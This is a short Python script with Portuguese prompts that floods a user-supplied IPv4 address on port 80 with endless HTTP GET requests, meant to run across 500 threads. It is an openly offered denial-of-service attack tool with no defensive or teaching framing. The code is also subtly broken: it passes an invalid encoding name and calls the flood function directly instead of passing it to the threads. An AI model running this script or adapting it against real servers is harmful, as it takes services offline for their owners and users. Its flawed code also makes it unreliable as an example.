import socket
import threading

target = str(input("entre com o iPv4: "))
port = 80

def http_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1 \r\n").encode('ascii,'), (target, port))
        s.sendto(("Host: 192.168.56.2" + "\r\n\r\n").encode('ascii'), (target, port))
        print("Mandando Solicitação")


for i in range(500):
    thread = threading.Thread(target=http_flood())
    thread.start()
